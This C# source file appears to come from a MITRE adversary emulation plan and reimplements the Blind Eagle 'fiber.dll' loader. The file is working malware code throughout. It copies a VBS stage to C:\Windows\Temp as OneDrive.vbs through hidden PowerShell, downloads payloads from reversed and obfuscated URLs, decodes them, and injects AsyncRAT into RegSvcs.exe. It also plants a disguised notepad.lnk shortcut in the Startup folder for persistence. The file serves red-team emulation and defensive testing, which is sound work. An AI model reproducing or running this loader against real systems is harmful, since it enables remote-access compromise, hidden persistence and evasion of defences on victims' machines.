/*
# ---------------------------------------------------------------------------
# fiber.dll
        summary:
*          fiber.dll uses PowerShell to copy the first stange loader as file called OneDrive.vbs and saves it in C:\Windows\Temp
*          fiber.dll then downloads obfuscated rump.xls (fsociety.dll) and asy.txt (AsyncRAT) payloads
*          fiber.dll does character replacement, unreverse, and base64 decodes prior to executing each payload and on the second URL (AsyncRAT)
*          fiber.dll then loads fsociety.dll and calls the Ande function to inject AsyncRAT into RegSvcs.exe
 # © 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076
 
 # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

 # http://www.apache.org/licenses/LICENSE-2.0

 # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

 # This project makes use of ATT&CK®
 # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Revision History:

# ---------------------------------------------------------------------------
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace fiber
{
    public class Home
    {
        public static void VAI(object url)
        {
            /*
             * [fiber.Home]::VAI()
             *     About: 
             *          fiber.dll uses PowerShell to copy the first stange loader as file called OneDrive.vbs and saves it in C:\Windows\Temp
             *          fiber.dll then downloads obfuscated rump.xls (fsociety.dll) and asy.txt (AsyncRAT) payloads
             *          fiber.dll does character replacement, unreverse, and base64 decodes prior to executing each payload and on the second URL (AsyncRAT)
             *          fiber.dll then loads fsociety.dll and calls the Ande function to inject AsyncRAT into RegSvcs.exe
             *      Returns:
             *          No Return
             *      MITRE ATT&CK Techniques:
             *          T1036.005 Masquerading: Match Legitimate Name or Location
             *          T1059.001 Command and Scripting Interpreter: PowerShell
             *          T1132.001 Data Encoding: Standard Encoding
             *          T1140 Deobfuscate/Decode files or Information
             *      CTI:
             *          https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
             *           https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/
             *  
             */
            try
            {
                // Copy the first stage loader into C:\Windows\Temp using PowerShell
                if (!File.Exists("C:\\Windows\\Temp\\OneDrive.vbs"))
                {
                    new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,

                            FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                            Arguments = " -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\\Windows\\Temp\\OneDrive.vbs"
                        }
                    }.Start();
                }
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                string text = new WebClient
                {
                    Encoding = Encoding.UTF8
                }.DownloadString(Strings.StrReverse("slx.pmuR/pmuR/5.0.861.291//:ptth")); // http://192.168.0.5/Rump/Rump.xls

                text = Strings.StrReverse(text);
                text = text.Replace("♛➤❤", "A");

                WebClient webClient = new WebClient();
                webClient.Encoding = Encoding.UTF8;
                
                // Build the URL to download AsyncRAT
                string address = Strings.StrReverse(Conversions.ToString(url)).Replace("(ø+(*", "b")
                                        .Replace("}░ú(}!", "c").Replace("▶ø�}4", "d").Replace("(◀▲*∞", "e")
                                        .Replace("@@�░@+@◀", "x").Replace("⇝*@☟▲(*↓", "h").Replace("�П}�√☞☀ø", "t")
                                        .Replace("(ú∞(]", "1").Replace("ú*@@(øú(", "2").Replace("◀+→↓}ð☟▶", ":")
                                        .Replace("▶:#☞*●*4", "/").ToString(); // https://path/to//asy.txt

                // Download AsyncRAT
                string text2 = webClient.DownloadString(address);
                // Unreverse the payload string
                text2 = Strings.StrReverse(text2);
                // Build the first argument for Ande
                string str = "C:\\Windows\\Microsoft.NET\\Framework";
                str += "\\v4.0.30319";
                // run fsociety.dll and load AsyncRAT
                AppDomain.CurrentDomain.Load(Convert.FromBase64String(text)).GetType("fsociety.Tools").GetMethod("Ande").Invoke(null, new object[]
                {
                    str += "\\RegSvcs.exe",
                    Convert.FromBase64String(text2)
                });

                // Establish persistence
                fiber.Optical.startup();
            }
            catch (Exception ex)
            {

            }
        }
    }

    public sealed class Optical
    {
        public static void startup()
        {
            /*
            * [fiber.Optical]::startup()
            *   About:
            *       The startup() function establishes persistence by creating an lnk file in the the users Startup folder
            *       pointing to the first stage loader saved to C:\Windows\Temp\OneDrive.vbs.
            *   Results:
            *       An lnk file should be placed in the users startup folder that calls PowerShell to execute OneDrive.vbs after a short sleep
            *   MITRE ATT&CK Techniques:
            *       T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
            *       T1547.009 Boot or Logon Execution: Shortcut Modification
            *       T1036.005 Masquerading: Match Legitimate Name or Location
            */
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "SpecialFolders", new object[]
			{
				"Startup"
			}, null, null, null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
			{
				Operators.ConcatenateObject(objectValue2, "\\notepad.lnk")
			}, null, null, null));
			NewLateBinding.LateSet(objectValue3, null, "IconLocation", new object[]
			{
				"notepad.exe, 0"
			}, null, null);
			NewLateBinding.LateSet(objectValue3, null, "TargetPath", new object[]
			{
				"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			}, null, null);
			NewLateBinding.LateSet(objectValue3, null, "WorkingDirectory", new object[]
			{
				"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			}, null, null);
			NewLateBinding.LateSet(objectValue3, null, "WindowStyle", new object[]
			{
				7
			}, null, null);
			NewLateBinding.LateSet(objectValue3, null, "Arguments", new object[]
			{
 //  Sleep
				"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden Start-Sleep 5;Start-Process C:\\Windows\\Temp\\OneDrive.vbs"
			}, null, null);
			NewLateBinding.LateSet(objectValue3, null, "Description", new object[]
			{
				"Microsoft"
			}, null, null);
			NewLateBinding.LateCall(objectValue3, null, "Save", new object[0], null, null, null, true);
        }
    }
}
